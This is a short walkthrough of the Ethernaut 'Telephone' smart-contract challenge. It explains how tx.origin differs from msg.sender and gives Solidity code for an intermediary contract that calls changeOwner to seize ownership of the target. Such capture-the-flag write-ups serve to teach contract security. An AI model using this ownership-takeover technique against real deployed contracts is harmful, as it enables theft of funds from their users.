The trick in this one depends on "who's calling?"

There's pretty much nothing to this contract except for a `changeOwner` function and within this, there's a simple if statement to transfer ownership:
```javascript
if (tx.origin != msg.sender) {
    owner = _owner
}
```

What's the difference between `msg.sender` and `txn.origin`? We can see [from here](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin) that `msg.sender` can be a contract, while `tx.origin` can never be a contract.
* `msg.sender` is the *address of the caller of the function*
* `txn.origin` is the *address that originated the function call*

## Solution
If we call `changeOwner` from a smart contract, `msg.sender` will be the contract address while `tx.origin` will be the original transaction sender (`tx.from`).

1. Head over to remix and duplicate the `Telephone` contract.
2. Create a second contract, `TappedPhone` and instantiate the `Telephone` contract
```javascript
contract TappedPhone {
    Telephone ethernautContract = Telephone(/*<YOUR CONTRACT INSTANCE>*/)
}
```
3. And then we call the `changeOwner` function from within `TappedPhone`
``` javascript
    function gimmeYoPhone(address attacker) external payable {
        ethernautContract.changeOwner(attacker);
    }
```